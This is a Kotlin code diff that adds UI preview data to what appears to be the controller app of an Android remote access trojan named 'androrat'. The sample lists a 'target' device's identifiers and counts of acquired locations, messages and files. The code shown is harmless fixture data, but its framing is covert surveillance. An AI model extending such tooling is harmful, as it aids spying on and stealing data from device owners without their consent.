@@ -6,6 +6,9 @@ import com.ierusalem.androrat.features.home.domain.model.Category
 import com.ierusalem.androrat.features.home.domain.model.DrawerClicks
 import com.ierusalem.androrat.features.home.domain.model.UserProfile
 import com.ierusalem.androrat.features.rtc_features.rtc.domain.AndroRtcClient
+import com.ierusalem.androrat.features.rtc_features.rtc_info.domain.AcquiredData
+import com.ierusalem.androrat.features.rtc_features.rtc_info.domain.AndroRtcClientInfo
+import com.ierusalem.androrat.features.rtc_features.rtc_info.domain.DeviceInfo
 
 sealed class AppPreview {
 
@@ -28,7 +31,38 @@ sealed class AppPreview {
         )
     }
 
-    object PreviewAndroRtc{
+    object PreviewAndroRtcInfo {
+        val androRtcClientInfo = AndroRtcClientInfo(
+            targetName = "Gleb",
+            deviceInfo = DeviceInfo(
+                brand = "Pixel",
+                deviceID = "8de445913dacb388",
+                model = "Pixel 8",
+                id = "OPM1.112334434",
+                sdk = "33",
+                manufacture = "Google",
+                hardware = "x86",
+                bootloader = "unknown",
+                user = "user",
+                type = "eng",
+                base = "eng",
+                incremental = "13",
+                board = "goldfish",
+                host = "unknown",
+                fingerprint = "unknown",
+                display = "unknown",
+                imei = "Permission denied",
+                versionCode = "12"
+            ),
+            acquiredData = AcquiredData(
+                locations = "12",
+                messages = "12",
+                files = "12"
+            )
+        )
+    }
+
+    object PreviewAndroRtc {
         val androRtcClients = listOf(
             AndroRtcClient(
                 clientName = "Gleb",
